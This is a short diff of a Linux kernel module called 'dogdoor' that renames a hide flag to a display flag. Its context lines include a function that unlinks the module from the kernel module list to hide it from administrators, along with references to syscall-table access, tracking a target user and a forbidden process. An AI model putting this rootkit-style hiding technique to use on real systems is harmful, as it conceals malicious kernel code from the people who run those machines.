@@ -21,7 +21,7 @@ void **sctable;
 // Targets
 uid_t target_uid = -1;
 pid_t target_pid = -1;
-int is_hide = 0;
+int is_display = 1;
 
 char filenames[FILE_COUNT][NAME_LEN];
 int filecount = 0;
@@ -83,13 +83,13 @@ void set_target_pid(pid_t target) {
 void hide_module(void) {
 	(&THIS_MODULE->list)->prev->next = (&THIS_MODULE->list)->next;
 	(&THIS_MODULE->list)->next->prev = (&THIS_MODULE->list)->prev;
-	is_hide = 1;
+	is_display = 0;
 }
 
 void display_module(void) {
 	(&THIS_MODULE->list)->prev->next = &THIS_MODULE->list;
 	(&THIS_MODULE->list)->next->prev = &THIS_MODULE->list;
-	is_hide = 0;
+	is_display = 1;
 }
 
 /* Dogdoor system call vector
@@ -130,7 +130,7 @@ static ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t si
 	sprintf(buf, "Tracking uid: %d\nLog ---\n", target_uid);
 	temp = log_read();
 	strcat(buf, temp);
-	sprintf(buf + strlen(buf), "--- end\n\nForbidden pid: %d\n\nHide: %d\n", target_pid, is_hide);
+	sprintf(buf + strlen(buf), "--- end\n\nForbidden pid: %d\n\nDisplay: %d\n", target_pid, is_display);
 
 	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset;
 	if (copy_to_user(ubuf, buf + *offset, toread))
